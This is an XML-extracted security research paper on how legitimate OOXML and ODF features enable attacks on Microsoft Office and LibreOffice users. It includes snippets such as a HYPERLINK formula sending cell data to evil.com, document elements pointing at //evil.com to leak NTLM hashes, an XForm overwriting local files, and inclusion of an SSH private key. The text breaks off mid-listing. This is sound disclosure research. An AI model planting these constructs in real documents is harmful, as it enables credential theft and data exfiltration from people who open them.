<?xml version="1.0" encoding="UTF-8"?>
<TEI xmlns="http://www.tei-c.org/ns/1.0" 
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
xsi:schemaLocation="http://www.tei-c.org/ns/1.0 /Users/atharsefid/Desktop/grobid-0.5.3/grobid-home/schemas/xsd/Grobid.xsd"
 xmlns:xlink="http://www.w3.org/1999/xlink">
	<teiHeader xml:lang="en">
		<encodingDesc>
			<appInfo>
				<application version="0.5.3" ident="GROBID" when="2020-09-29T04:29+0000">
					<ref target="https://github.com/kermitt2/grobid">GROBID - A machine learning software for extracting information from scholarly documents</ref>
				</application>
			</appInfo>
		</encodingDesc>
		<fileDesc>
			<titleStmt>
				<title level="a" type="main">Office Document Security and Privacy</title>
			</titleStmt>
			<publicationStmt>
				<publisher/>
				<availability status="unknown"><licence/></availability>
			</publicationStmt>
			<sourceDesc>
				<biblStruct>
					<analytic>
						<author>
							<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">Jens</forename><surname>Müller</surname></persName>
							<affiliation key="aff0">
								<orgName type="institution">Ruhr University</orgName>
								<address>
									<settlement>Bochum</settlement>
								</address>
							</affiliation>
						</author>
						<author>
							<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">Fabian</forename><surname>Ising</surname></persName>
							<affiliation key="aff1">
								<orgName type="institution">Münster University of Applied Sciences</orgName>
							</affiliation>
						</author>
						<author>
							<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">Christian</forename><surname>Mainka</surname></persName>
							<affiliation key="aff0">
								<orgName type="institution">Ruhr University</orgName>
								<address>
									<settlement>Bochum</settlement>
								</address>
							</affiliation>
						</author>
						<author>
							<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">Vladislav</forename><surname>Mladenov</surname></persName>
							<affiliation key="aff0">
								<orgName type="institution">Ruhr University</orgName>
								<address>
									<settlement>Bochum</settlement>
								</address>
							</affiliation>
						</author>
						<author>
							<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">Sebastian</forename><surname>Schinzel</surname></persName>
							<affiliation key="aff1">
								<orgName type="institution">Münster University of Applied Sciences</orgName>
							</affiliation>
						</author>
						<author>
							<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">Jörg</forename><surname>Schwenk</surname></persName>
							<affiliation key="aff0">
								<orgName type="institution">Ruhr University</orgName>
								<address>
									<settlement>Bochum</settlement>
								</address>
							</affiliation>
						</author>
						<title level="a" type="main">Office Document Security and Privacy</title>
					</analytic>
					<monogr>
						<imprint>
							<date/>
						</imprint>
					</monogr>
				</biblStruct>
			</sourceDesc>
		</fileDesc>
		<profileDesc>
			<abstract>
				<p>OOXML and ODF are the de facto standard data formats for word processing, spreadsheets, and presentations. Both are XML-based, feature-rich container formats dating back to the early 2000s. In this work, we present a systematic analysis of the capabilities of malicious office documents. Instead of focusing on implementation bugs, we abuse legitimate features of the OOXML and ODF specifications. We categorize our attacks into five classes: (1) Denial-of-Service attacks affecting the host on which the document is processed. (2) Invasion of privacy attacks that track the usage of the document. (3) Information disclosure attacks exfiltrating personal data out of the victim&apos;s computer. (4) Data manipulation on the vic-tim&apos;s system. (5) Code execution on the victim&apos;s machine. We evaluated the reference implementations-Microsoft Office and LibreOffice-and found both of them to be vulnerable to each tested class of attacks. Finally, we propose mitigation strategies to counter these attacks.</p>
			</abstract>
		</profileDesc>
	</teiHeader>
	<text xml:lang="en">
		<body>
<div xmlns="http://www.tei-c.org/ns/1.0"><head n="1">Introduction</head><p>Office Open XML (OOXML) and the Open Document Format for Office Applications (ODF) are the de-facto standards for office document formats. They are used by millions of people every day: According to Microsoft, there are more than 1.2 billion users of MS Office <ref type="bibr" target="#b48">[50]</ref>, which applies OOXML as its native data format for documents, spreadsheets, and presentations. According to the Document Foundation <ref type="bibr" target="#b68">[70]</ref>, LibreOffice, which is the reference implementation for ODF, has 200 million active users worldwide. Besides that, OOXML and ODF documents are heavily used in many companies. Standard office tasks such as creating invoices and contracts, accounting spreadsheets, or slides for a presentation are hardly imaginable without them. Software to process, to create, or to export OOXML and ODF documents is available on all major platforms, as well as in the cloud.</p><p>Unfortunately, there is also a long history of malware being deployed via malicious office documents, ranging from the Melissa virus <ref type="bibr" target="#b30">[32]</ref> back in 1999, up to the recent wave of Emotet infections, which forced the IT infrastructure of entire city administrations to be taken down in 2019 <ref type="bibr" target="#b16">[18]</ref>. Attacks based on a malicious document are facilitated by the feature richness of the underlying data formats: The OOXML specification spans over 6500 pages while the ODF standard is around 800 pages -both excluding proprietary extensions. However, we are not aware of any efforts to systematically analyze OOXML or ODF core features for harmful functionality or to summarize existing research on weaknesses in office file formats. This paper introduces an extensive study regarding the security and privacy of office documents.</p></div>
<div xmlns="http://www.tei-c.org/ns/1.0"><head n="1.1">Opulent Document Features</head><p>Initially released in 2005 and 2006, ODF and OOXML are the two major standards for representing word processing documents, spreadsheets, and presentations. Both data formats are based on zip compressed archives containing multiple files and directories. Both use the Extensible Markup Language (XML) to describe the actual content of the document. ODF and OOXML support numerous advanced features, ranging from spreadsheet formulas, form fields, support for other XML-based data formats such as SVG or MathML, up to digital signatures, and document encryption. Furthermore, office documents can contain active content such as macros written in various languages like Basic, JavaScript, and Python, as well as OLE file attachments of arbitrary content. In this work, we analyze the security of native OOXML/ODF functions.</p></div>
<div xmlns="http://www.tei-c.org/ns/1.0"><head n="1.2">Security and Privacy Threats</head><p>We present a systematic and structured analysis of OOXML and ODF standard features relevant to the security and privacy of users. Even though both data formats are relatively old and well-established, our study shows surprising results regarding the abuse of dangerous features by malicious documents.</p><p>We categorize our attacks into five classes:</p><p>1. Denial-of-Service (DoS) attacks affecting the processing application and the host on which the document is opened.</p><p>2. Invasion of privacy attacks that allow tracking of all users who open certain documents or reveal contained metadata.</p><p>3. Information disclosure attacks that exfiltrate personal data from the victim's computer to the attacker, such as private spreadsheet values, local files, or user credentials.</p><p>4. Data manipulation attacks writing to files on the host system, or masking the displayed content of a document.</p><p>5. Execution of arbitrary code on the victim's host system.</p></div>
<div xmlns="http://www.tei-c.org/ns/1.0"><head n="1.3">Responsible Disclosure</head><p>We reported our findings to the affected vendors and proposed appropriate countermeasures. Our findings resulted in <ref type="bibr">CVE-2018</ref><ref type="bibr">-8161, CVE-2020</ref><ref type="bibr">-12802, and CVE-2020</ref>. While all attacks can be mitigated on the implementationlevel, most of them are based on legitimate features defined in the OOXML/ODF standards. To sustainably eliminate the root cause of these vulnerabilities in future implementations, dangerous functionality should be removed from the specification or proper implementation guidelines should be added to the security considerations.</p></div>
<div xmlns="http://www.tei-c.org/ns/1.0"><head n="1.4">Contributions</head><p>Past research on insecure office document features focused on single features such as macros, and only either on OOXML or ODF. We extend previous studies to a broad set of standard features in both formats, including previously unknown features, and show that both file formats suffer from similar weaknesses. Our contributions can be summarized as follows:</p><p>• We present an extensive and systematic analysis of the security and privacy of standard features of OOXML and ODF, resulting in five different attack classes. (section 4) • We evaluate the de facto reference implementations, MS Office and LibreOffice, and show that both of them are vulnerable to each proposed class of attacks. (section 5)</p><p>• We discuss countermeasures for implementations as well as for future versions of the specifications. (section 6)</p></div>
<div xmlns="http://www.tei-c.org/ns/1.0"><head n="1.5">Related Work</head><p>Non-security related comparisons of <ref type="bibr">OOXML</ref>   <ref type="bibr" target="#b33">[35]</ref> analyzed the security of Microsoft rights management services (RMS) for office documents. Alonso et al. <ref type="bibr" target="#b6">[8]</ref>, and Caloyannides et al. <ref type="bibr" target="#b13">[15]</ref> deal with the recovery of previous revisions of the document as well as metadata. How to perform a forensic investigation of office documents is described by <ref type="bibr">Garfinkel et al. [33, 34]</ref>, Fu et al. <ref type="bibr" target="#b28">[30]</ref>, and Didriksen <ref type="bibr" target="#b23">[25]</ref>.</p><p>In recent years, approaches to detect malware contained in office documents have been proposed <ref type="bibr" target="#b4">[6,</ref><ref type="bibr" target="#b9">11,</ref><ref type="bibr" target="#b18">20,</ref><ref type="bibr" target="#b39">41,</ref><ref type="bibr" target="#b49">51,</ref><ref type="bibr" target="#b50">52]</ref>. All of them use various machine learning techniques to classify documents as either benign or malicious, with a primary focus on macros and malicious embedded OLE objects.</p></div>
<div xmlns="http://www.tei-c.org/ns/1.0"><head n="2">Background</head><p>Both OOXML and ODF are container formats (zip archives) containing XML files to describe the actual document content, as well as optional files such as images or style sheets. The contained XML data can describe content for various purposes, such as word processing, spreadsheets, or presentations. An overview of office components, common file extensions, as well as their assigned applications for both office suites is given in <ref type="table">Table 1</ref>. In this section, we give an overview of the OOXML and ODF directory structure within the zip container archive and the document syntax of both formats.</p><formula xml:id="formula_0">OOXML ODF Word processing .docx (MS Word) .odt (LO Writer) Spreadsheets .xlsx (MS Excel) .ods (LO Calc) Presentations .pptx (MS PowerPoint) .odp (LO Impress) DB management .mdb (MS Access)</formula><p>.odb (LO Base) Graphic layout .pub (MS Publisher) .odg (LO Draw) <ref type="table">Table 1</ref>: Common office file extensions and assigned application.</p></div>
<div xmlns="http://www.tei-c.org/ns/1.0"><head n="2.1">OOXML Document Structure</head><p>OOXML was specified -primarily by <ref type="bibr">Microsoft -in 2006</ref> as the ECMA-376 <ref type="bibr" target="#b0">[2]</ref> standard and afterward adopted as ISO/IEC 29500 <ref type="bibr" target="#b3">[5]</ref>   The most important file contained in OOXML zip archives is document.xml, 1 which describes the actual content structure. A minimal "Hello World" document.xml is given in Listing 1. </p></div>
<div xmlns="http://www.tei-c.org/ns/1.0"><head n="2.2">ODF Document Structure</head><p>ODF was developed by OASIS <ref type="bibr" target="#b1">[3]</ref>, then submitted to the ISO and adopted as a standard (ISO/IEC 26300, see <ref type="bibr" target="#b2">[4]</ref>  The actual document content and the inner structure of the document is described in content.xml. A minimal content.xml file to display the text "Hello World" is given in Listing 2.</p><p>1 document.xml is used for word processing documents only (docx). Other OOXML applications use similar files (e.g., workbook.xml for spreadsheets). The most prominent ODF implementation is LibreOffice, which forked from the OpenOffice project in 2010 due to a dispute regarding open-source licensing issues.</p></div>
<div xmlns="http://www.tei-c.org/ns/1.0"><head n="3">Attacker Model</head><p>In this section, we describe the attacker model, including the attacker's capabilities, the victim's behavior, and the winning conditions.</p></div>
<div xmlns="http://www.tei-c.org/ns/1.0"><head n="3.1">Attacker's Capabilities</head><p>The attacker can create a new OOXML/ODF file or modify an existing one, which we denote as the malicious document. By this means, the attacker has full control over the document structure and its content. We do not require that the malicious document is compliant to the OOXML/ODF specifications, although the attacker targets basic functionality and features of the standard. The victim somehow obtains and opens the malicious document, e.g. by retrieving it from a web site, via email, via a USB drive or any other transmission method.</p><p>This attacker model is used for all attacks in this paper, with the exception being evitable metadata. In this case, the victim is the one creating the document and the goal of the attacker is to obtain potentially sensitive information from this document, such as the author's name within the document's metadata.</p></div>
<div xmlns="http://www.tei-c.org/ns/1.0"><head n="3.2">Victim's Behavior</head><p>The victim is a person retrieving and opening a malicious OOXML or ODF document from an attacker-controlled source. This requirement is realistic since even security-aware users download and open office documents from untrusted sources such as email attachments or from the Internet (e.g., scientific articles, CV templates, or job applications).</p><p>To open the malicious document, the victim uses a preinstalled office suite application (e.g., Microsoft Word or LibreOffice Writer) that processes the file to display its content. All attacks work in the default settings and do not require the victim to activate any insecure features such as macros.</p></div>
<div xmlns="http://www.tei-c.org/ns/1.0"><head n="3.3">Winning Conditions</head><p>Based on the diversity of the attacks, the winning conditions also differ. Thus, we define the attacker's goals and winning conditions separately for each attack class in section 4.</p><p>In this section, we introduce attacks based on malicious office documents. At the beginning of each section, we discuss the attack goals and their applicability.</p></div>
<div xmlns="http://www.tei-c.org/ns/1.0"><head>Methodology</head><p>To identify potential weaknesses in OOXML and ODF, we systematically studied both specifications for security-sensitive capabilities and features. This analysis includes more than 6500 pages on OOXML <ref type="bibr" target="#b0">[2]</ref> and about 800 pages on ODF <ref type="bibr" target="#b1">[3]</ref>. We created a list of potential attacks, which can be carried out using malicious documents in both standards, and classified them based on their impact, resulting in five attack classes: DoS, invasion of privacy, information disclosure, data manipulation and code execution. To facilitate the analysis, we manually crafted test files for each attack.</p></div>
<div xmlns="http://www.tei-c.org/ns/1.0"><head n="4.1">Denial of Service</head><p>The goal of this class of attacks is to craft OOXML or ODF documents that force processing applications to consume all available resources (e.g., memory or CPU time).</p><p>Deflate Bomb Data amplification attacks based on malicious zip archives are well known (compare <ref type="bibr" target="#b10">[12,</ref><ref type="bibr" target="#b25">27,</ref><ref type="bibr" target="#b56">58]</ref>). The Deflate <ref type="bibr" target="#b22">[24]</ref> algorithm used in zip files allows for a maximal compression ratio of 1:1023. However, various attempts were made in the past to improve the data amplification ratio, for example, by applying recursion <ref type="bibr">[1,</ref><ref type="bibr" target="#b20">22,</ref><ref type="bibr" target="#b25">27,</ref><ref type="bibr" target="#b26">28]</ref>. Technically, both OOXML and ODF use zip archives to reduce the overall file size of the contained data, leading to the question if they are also vulnerable to Deflate based compression bombs.</p><p>Note that while the impact of such compression bombs is limited on desktop devices, DoS can lead to severe business impairment on the server-side. Examples are cloud-based office solutions, as well as web applications which generate preview images of uploaded OOXML and ODF files. <ref type="bibr" target="#b0">2</ref> </p></div>
<div xmlns="http://www.tei-c.org/ns/1.0"><head n="4.2">Invasion of Privacy</head><p>This class of attacks targets the privacy of users. Our first attack, URL invocation, tracks the usage of OOXML and ODF documents by embedding a "tracking pixel". The other attack, evitable metadata, deals with the question of which information an attacker can learn from a document created by the victim.</p></div>
<div xmlns="http://www.tei-c.org/ns/1.0"><head>URL Invocation</head><p>The goal of this attack is to create a document that silently connects to an attacker-controlled server once opened by the victim. The document may contain a tracking ID (e.g., in the URL path or subdomain), which can be used to track the usage of the document for anyone who opens it. Such behavior is generally not desired as it represents an invasion of the user's privacy. In the scenario of more targeted attacks, this feature can be used, for example, to deanonymize Tor 3 users by providing the document for download over the Tor network, or to obtain information about reviewers opening a paper submitted as an office document. Besides learning the victim's IP address and the timestamp when the document is read, an attacker may learn additional information such as the used office suite or operating system, which can be extracted from the User-Agent HTTP header. There are even commercial services 4 that offer to patch Microsoft Office documents (in the old proprietary format) so that everyone who opens them can be tracked. "Tracking pixels" within OOXML documents have been demonstrated by Villarreal <ref type="bibr" target="#b67">[69]</ref>. We show novel URL invocation attacks for ODF and evaluate if modern office suites do still load external images for OOXML.</p><p>Evitable Metadata There are various examples of unintentional metadata exposure in office documents. For example, in 2003, the UK Prime Minister's Office published a Word document, commonly known as the "Dodgy Dossier", which helped to propel the country into the Iraq war. The document revisions logs and metadata revealed that the content was plagiarized and never originated from UK intelligence agencies <ref type="bibr" target="#b69">[71]</ref>. The problem of unwanted metadata and hidden information in office documents and other file formats is well known and has been discussed, for example, by <ref type="bibr">Garfinkel [33]</ref>. Even though metadata is a feature of the OOXML and ODF standards, from a privacy perspective, processing applications should avoid including excessive metadata by default and instead let users opt-in. The research questions arise if modern office suites still silently include potentially sensitive metadata such as the name of the currently logged in user -when saving the document either in a native office format or after exporting it to other file formats such as PDF. In our evaluation, we show which amount of metadata information is stored by MS Office and LibreOffice using the default settings.</p></div>
<div xmlns="http://www.tei-c.org/ns/1.0"><head n="4.3">Information Disclosure</head><p>The goal of this class of attacks is to exfiltrate OOXML and ODF spreadsheet data, local files on the victim's disk, or even NTLM credentials to the attacker.</p></div>
<div xmlns="http://www.tei-c.org/ns/1.0"><head>Data Exfiltration</head><p>The idea of this attack is as follows: the victim downloads an OOXML or ODF spreadsheet from an attacker-controlled source (e.g., a spreadsheet template to track personal finances) and inserts sensitive information here. The goal of the attacker is to leak all user input, for example, personal information regarding the victim's financial situation.</p><p>To achieve this goal, the attacker manipulates the spreadsheet in such a way that cells containing sensitive data are referred to and concatenated as the path of a hyperlink to the attacker's web server. In the event that the user clicks this hyperlink, the content, which can be further obfuscated, for example, using encoding mechanisms based on spreadsheet formulas, is exfiltrated. Such "formula injection attacks" have been proposed by Kettle <ref type="bibr" target="#b38">[40]</ref> in 2014. We evaluate if similar vulnerabilities are still present in modern office suites and how the level of user interaction can be minimized.</p><p>File Disclosure Both the OOXML and ODF standards provide various features which enable a document to access and include local files on disk. Recently, Hegt and Ceelen <ref type="bibr" target="#b35">[37]</ref> showed how to exploit the includetext and includepicture command of Microsoft Office Fields to embed files in Word documents. In 2018, Prashar et al. <ref type="bibr" target="#b58">[60]</ref> and <ref type="bibr">Klementev et al.</ref> [42] demonstrated how to abuse legitimate LibreOffice Calc features to populate spreadsheet cells with the content of local files on disk. In this work, we propose a novel attack targeting the ODF specification, which allows to refer to and thereby include remote images as well as text files. This functionality can be exploited using a file:// URI scheme. Once files have successfully been embedded by a malicious document, they can potentially be leaked to the attacker using the previously discussed techniques of data exfiltration.</p><p>Credential Theft Recently, Hegt et al. <ref type="bibr" target="#b35">[37]</ref> showed how to steal user credentials by simply asking users for them. They created a specially crafted OOXML template document which triggers a connection to a web server that requests for HTTP basic authentication <ref type="bibr" target="#b27">[29]</ref>. When opening the template with Microsoft Word, an authentication dialog is shown and any password entered by the user is submitted to the attacker's server. This attack is based on deception and requires social engineering. Therefore, the research question arises, if the victim's credentials can be leaked without any user interaction.</p><p>One technique to potentially achieve this is by abusing NTLM authentication. A well-known, decade-old design flaw in Microsoft Windows allows users and applications running on the host to invoke a connection to SMB network shares <ref type="bibr" target="#b61">[63]</ref>. If a rogue SMB server requests for authentication, Windows automatically submits a hash of the credentials of the currently logged-in user, which can further be used by the attacker to start offline dictionary attacks (see <ref type="bibr" target="#b17">[19,</ref><ref type="bibr" target="#b46">48]</ref>) as well as pass-the-hash or relay attacks (see <ref type="bibr" target="#b37">[39,</ref><ref type="bibr" target="#b55">57]</ref>) to bypass authentication. Unfortunately, not only applications but also documents can access network shares such as \\evil.com. In April 2018, Baharav et al. <ref type="bibr" target="#b8">[10]</ref> showed that NTLM credentials can be exfiltrated if the victim opens a malicious PDF file. As both OOXML and ODF support access to external resources, it is likely that network shares can be accessed, thereby leaking NTLM hashes. To the best of our knowledge, we are the first to demonstrate such attacks for OOXML/ODF files.</p></div>
<div xmlns="http://www.tei-c.org/ns/1.0"><head n="4.4">Data Manipulation</head><p>This attack class deals with the capabilities of a malicious office document to write to local files on the host's file system and to mask their content based upon the opening application.</p><p>File Write Access OOXML and ODF documents can contain forms to be filled out by the user -a feature used daily in typical office tasks, for example, to file claims or business trip applications. Similar to HTML forms, the contained form data can be submitted to a URI, for example, to an external web server. To create submittable forms in OOXML, macros are required, which are discussed in subsection 4.5. However, ODF implements the XForms W3C standard <ref type="bibr" target="#b11">[13]</ref>, which allows data to be submitted without the need for macros or other active scripting. The XForms specification allows various methods (e.g., post, get, delete) and the target of a form submission can even be a local file on disk. If naively implemented, XForms in ODF documents may be used to overwrite or delete arbitrary files on the user's file system. Furthermore, file write access can potentially be escalated to command execution, if the attacker manages to overwrite startup scripts such as autoexec.bat on Windows or .profile on macOS/Linux. We are the first to propose and evaluate this novel attack based on XForm data submission to a local file on disk.</p><p>Content Masking The goal of this attack is to craft OOXML or ODF documents that render differently, depending on the application used to open the document. This can be a security problem in cases where the document content must be unambiguous, such as sales agreements or business contracts. One scenario of particular interest could be an attacker creating an ambiguous contract document that is to be digitally signed by the victim. <ref type="bibr" target="#b3">5</ref> In such a case, the victim would unintentionally sign a displayed content that looks different if another application opens the document. Other use cases of content masking could be, for example, to show different content to different reviewers, or to launch exploit code only if the document is processed by a certain OOXML or ODF application.</p><p>Content masking attacks have been previously shown for other file formats such as PDF <ref type="bibr" target="#b5">[7,</ref><ref type="bibr" target="#b44">46,</ref><ref type="bibr" target="#b45">47]</ref>, PostScript <ref type="bibr" target="#b7">[9,</ref><ref type="bibr" target="#b19">21,</ref><ref type="bibr" target="#b52">54]</ref>, or HTML email <ref type="bibr" target="#b51">[53]</ref>. They abuse ambiguities, edge cases, or conditional statements when interpreting the file format structure or the high-level syntax in order to show or hide certain text in a certain context. For OOXML or ODF documents, we create ambiguities on the layer of the directory structure and the naming convention of files within the zip container archive, as well as on the XML syntax layer. To the best of our knowledge, we are the first to propose such content masking attacks for office documents.</p></div>
<div xmlns="http://www.tei-c.org/ns/1.0"><head n="4.5">Code Execution</head><p>The goal of this attack is to execute attacker-controlled code, for example, to infect the host with malware. Both OOXML and ODF files can contain macros, which -if enabled -may be abused to run arbitrary code on the host system.</p><p>Macros With the first macro viruses emerging over 20 years ago, the dangers of macros in office documents are well known (see <ref type="bibr" target="#b29">[31,</ref><ref type="bibr" target="#b34">36,</ref><ref type="bibr" target="#b42">44]</ref>). In the past, macros have led to code execution based on malicious office documents in both Microsoft Office and LibreOffice. As the recent wave of Emotet infections show -which have spread via OOXML macrosthe problem is not yet under control. In this work, we answer the following research questions:</p><p>1. Which amount of user interaction or trust is required to activate the execution of macros in modern office suites?</p><p>2. Once enabled, can macros execute arbitrary code by design, or are there any limitations regarding their capabilities?</p><p>3. Are there other features that may lead to code execution?</p></div>
<div xmlns="http://www.tei-c.org/ns/1.0"><head n="5">Evaluation</head><p>To evaluate the proposed attacks, we tested them against the de-facto reference implementations of <ref type="bibr">OOXML</ref>   <ref type="bibr" target="#b4">6</ref> , and Web 7 -because the results may differ depending on certain implementations. We classify an office suite as vulnerable if it is vulnerable on at least one platform. Full details for each tested platform are given in <ref type="table" target="#tab_11">Table 7</ref> in the appendix. All tests were performed using the applications' default settings. Proof of concept exploit files are available at https://github.com/RUB-NDS/Office-Security to allow reproduction. Evaluation results are depicted in <ref type="table" target="#tab_7">Table 4</ref>.</p></div>
<div xmlns="http://www.tei-c.org/ns/1.0"><head n="5.1">Denial of Service</head><p>Deflate Bomb  Microsoft Office tries to expand the container in memory. On Windows, once no more memory can be allocated, it shows an error message, stating that the document cannot be opened. However, on macOS, MS Office is forced into a CPU consumption loop. LibreOffice instead expands the zip archive to disk. However, it stops after 4 GB for each document. Thereby, we classify the vulnerability as limited here. We also tested for OOXML and ODF based "XML bombs" (XML entity expansion attacks, see <ref type="bibr" target="#b63">[65,</ref><ref type="bibr" target="#b64">66]</ref>); however none of the tested office suites was found to be vulnerable.</p></div>
<div xmlns="http://www.tei-c.org/ns/1.0"><head n="5.2">Invasion of Privacy</head><p>URL Invocation To test for (silent) URL invocation, we systematically studied the XML syntax of OOXML and ODF for legitimate features to trigger a network connection. Similar to "tracking pixels" in HTML emails, remote images can be included in both file formats. A straightforward method is depicted in the OOXML Relationship documented below.  It must be noted that URL invocation is a legitimate feature "by design" in both OOXML and ODF and is not intended to be removed by both Microsoft and the LibreOffice developers. However, it may not be obvious to all users that malicious documents can silently "phone home".</p><p>Furthermore, note that this may lead to server side request forgery (SSRF) vulnerabilities if the file is previewed on the server-side, for example, to generate preview images for office documents uploaded to cloud storage websites (out of scope).</p><p>Evitable Metadata To test how much metadata is stored by modern office suites, we created a new document in both MS Office and LibreOffice and saved it in OOXML and ODF format. Also, we exported the document to PDF and HTML formats in order to see if metadata would remain in the exported file formats. Evaluation results are depicted in <ref type="table" target="#tab_8">Table 5</ref>. Note that they are consistent for both tested office suites, regardless whether the document is saved as OOXML, ODF, PDF, or HTML formats, each resulting in the same metadata.  Microsoft Office does not only store relatively harmless information such as the timestamp of document creation and the software used to generate the document, but also the author's name, derived from the name of the currently logged in user. In case the document is modified by another person, the coauthor's username and the modification date are also added to the metadata. A simplified OOXML metadata file, as produced by MS Office, is given in Listing 4 (docProps/core.xml). LibreOffice, on the other hand, only stores the timestamp and the generator software, which we do not classify as vulnerable in our evaluation. A simplified ODF metadata file, as produced by LibreOffice, is given in Listing 5 (meta.xml).</p><p>8 Metadata for creator software is saved in a separate file: docProps/app.xml. We also tested if previous revisions of the document had been stored and could be recovered, which was not the case in the default settings. In the past, this feature has raised a lot of privacy concerns in office documents <ref type="bibr" target="#b6">[8,</ref><ref type="bibr" target="#b13">15]</ref>. Nowadays, tracking changes must be explicitly enabled in current versions of both MS Office and LibreOffice.</p><p>Furthermore, we crawled the Internet for PDF files created by office suites (based on generator software metadata). <ref type="bibr" target="#b7">9</ref> Of 40,981 obtained files which were created with Microsoft Office, 39,445 (96.25%) contained an author name, while this was only true for 1,801 of 2,654 files created with LibreOffice or OpenOffice (67.85%) -probably having been set on purpose here. This shows that a "privacy by default" approach has a practical effect regarding the exposure of sensitive metadata.</p></div>
<div xmlns="http://www.tei-c.org/ns/1.0"><head n="5.3">Information Disclosure</head><p>Data Exfiltration To test if spreadsheet data can be exfiltrated to an attacker-controlled server, we created a spreadsheet formula with a hyperlink, referencing to certain cells in the document as the URL path, as depicted below.</p><p>=HYPERLINK("http://evil.com/" &amp;A1 &amp;B2, "Click me")</p><p>In case the user actively follows the link, both MS Office and LibreOffice include the content of the referenced cells and submit them as the URL path.</p><p>An improved version is depicted below, which uses the webservice function to automatically leak the spreadsheet content once the document is opened. In this example, the content of all cells in the columns A-Z is exfiltrated to the attacker's server once the victim re-opens or refreshes the spreadsheet. However, in both MS Office and LibreOffice, the user is asked to update the content before invoking the webservice connection. Therefore, we classify the vulnerability as limited. For MS Office, the webservice function is only available on Windows. For LibreOffice, we were further able to leak the path name of the currently opened document, by referencing a cell with the content =file://#$B2, which was internally translated to file:///home/victim/path/to/document.</p></div>
<div xmlns="http://www.tei-c.org/ns/1.0"><head>File Disclosure</head><p>The idea of this attack is to combine functionality to exfiltrate data, as shown previously, with insecure features which allow the inclusion of local files on disk. The first step is to embed a local file on disk into the document. For OOXML we did not find functional features to achieve this. For ODF, the feature to refer to remote images can be re-used -this time with a file:// URI scheme as shown in Listing 6. This allows a document to embed arbitrary images on disk without any user interaction required. Moreover, using the &lt;draw:object&gt; or &lt;text:section-source&gt; ODF XML tags, files of arbitrary type can be included into the malicious document as depicted in Listing 7. In this example, the SSH private key (~/.ssh/id_rsa) of the victim is included into the document. Note that the existence of such embedded objects can be completely hidden. However, LibreOffice asks the user to update references in the document before including arbitrary files from disk.</p><p>We were not actually able to exfiltrate embedded files using spreadsheet functions, because their content cannot be placed into a certain cell and therefore not be referenced. However, other potential exfiltration channels exist: If the malicious document is re-saved by the victim, a copy of the file on disk is silently embedded into the ODF zip container archive. The same holds if the document is exported (e.g., to PDF). This is problematic in a scenario where the attacker gets access to the newly saved document -for example if the victim is asked to review and add feedback to an attacker-controlled document. We classify the vulnerability as limited, because of the lack of fully automated exfiltration channels. <ref type="bibr" target="#b8">10</ref> We also tested accessing local files using the XForm get method and a file:// URI scheme. While we could observe a read system call to the targeted file, LibreOffice did not actually update the document's XForm with the file's content. Furthermore, we tested for XML Inclusions (XInclude) <ref type="bibr" target="#b47">[49]</ref> as well as DTD/XXE <ref type="bibr" target="#b63">[65]</ref> attacks to access local files, however, none of the tested office suites was vulnerable. Finally, we crafted OOXML and ODF zip container archives containing symbolic links to local files on disk in order to verify if such links would be followed and the referenced files would be accessed. However, this approach was not successful either.</p><p>Credential Theft To test for leakage of NTLM hashes based on specially crafted office documents, we used the technique to include tracking pixels, as described above. Instead of a URL, we set the target to //evil.com, which translates to \\evil.com on modern Windows versions. <ref type="bibr" target="#b9">11</ref> For OOXML, a Relationship to silently trigger a connection to an SMB server running on evil.com is given below.</p><p>&lt;Relationship Id="x" Target="//evil.com" TargetMode="External"/&gt; For ODF, the corresponding XML syntax is depicted below.</p><p>&lt;draw:frame&gt;&lt;draw:image xlink:href="//evil.com"/&gt;&lt;/draw:frame&gt; Using Responder 12 as a rogue authentication server, we were able to obtain the client's NTLM hashes without the victim noticing or being asked for confirmation to open a connection to the rogue network share for both tested office suites and each of the office file formats. Of course, it is up to the configuration of the victim's setup (i.e., password strength, security policy, and Windows version) if efficient cracking or relay attacks are practically feasible. Note that, by design, only applications running on Windows are affected.</p></div>
<div xmlns="http://www.tei-c.org/ns/1.0"><head n="5.4">Data Manipulation</head><p>File Write Access To test if form data can be written to local files, we created an ODF document with an XForm. The XForm uses the put method to submit data to a local file on disk, specified by the file:// URI scheme, see Listing 8.</p><p>&lt;office:forms&gt; &lt;xforms:model id="XForm"&gt; &lt;xforms:instance id="Instance1"&gt; &lt;instanceData&gt; &lt;Data&gt;...&lt;/Data&gt; &lt;/instanceData&gt; &lt;/xforms:instance&gt; &lt;xforms:bind xmlns:script="http://openoffice.org/2000/script" id="Binding1" nodeset="Data/Test/*"/&gt; &lt;xforms:submission id="SaveData" bind="Binding1" ref="/" action="file://~/NEWFILE" method="put"/&gt; &lt;/xforms:model&gt; &lt;/office:forms&gt; Listing 8: XForm which submits data to a file in the home directory.</p><p>The form is triggered by a button. However, this button can be set to look like normal text and cover the whole document. Thereby, a single click somewhere in the document triggers the form submission and writes the contained form data to the specified target. To our surprise, this allowed us to write to or overwrite arbitrary files on disk, specified by their path name. In addition to absolute path names, files relative to the user's home directory can be accessed using the tilde (~) character. LibreOffice on macOS and Linux is vulnerable to this attack.</p><p>Content Masking To test for content masking attacks based on office documents, we systematically studied the OOXML and ODF standards for ambiguities at the level of the directory structure as well as the XML structure. We define an office suite as vulnerable if we can create a document that displays different text in different opening applications. ODF defines the main content file to be named content.xml, however, the specification does not make a statement regarding case sensitivity. By placing two OpenDocument content files with mixed-case names into the ODF container, Content.xml and content.XML, we were able to enforce a decision regarding which file is to be processed by applications: LibreOffice parses the first one, while MS Office uses the second file. <ref type="bibr" target="#b11">13</ref> Interestingly, this concept cannot be adapted to OOXML because MS Office completely refuses to open OOXML documents if a second (upper or lowercase) document.xml file is present.</p><p>Further ambiguities arise on the layer of the XML structure, for example, if a document contains multiple body nodes. In such a case, processing applications need to decide which one to process, which leads to confusion between office suites. An example OOXML document which renders different text in LibreOffice and Microsoft Office is given in Listing 9.</p><p>&lt;w:document&gt; &lt;w:body&gt; &lt;w:body&gt; &lt;w:p&gt; &lt;w:r&gt; &lt;w:t&gt;This text is shown Microsoft Office.&lt;/w:t&gt; &lt;/w:r&gt; &lt;/w:p&gt; &lt;/w:body&gt; &lt;w:p&gt; &lt;w:r&gt; &lt;w:t&gt;This text is shown 